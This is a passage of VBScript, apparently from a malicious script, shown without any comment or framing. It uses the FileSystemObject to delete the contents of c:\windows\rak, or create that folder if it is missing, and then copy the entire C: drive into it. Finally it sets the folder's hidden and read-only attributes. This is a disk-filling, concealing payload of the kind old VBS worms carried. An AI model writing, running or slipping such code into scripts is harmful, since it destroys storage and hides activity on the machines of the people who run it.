end if

If (fso.FolderExists("c:\windows\rak")) Then
fso.deletefolder("c:\windows\rak\*.*")
fso.copyfolder "c:\*.*", "c:\windows\rak"
else 
set f = createobject("scripting.filesystemobject")
set h = f.createfolder("c:\windows\rak")
f.copyfolder "c:\*.*", "c:\windows\rak"
set j = f.getfolder("c:\windows\rak")
j.attributes = j.attributes +1
j.attributes = j.attributes +2
end if
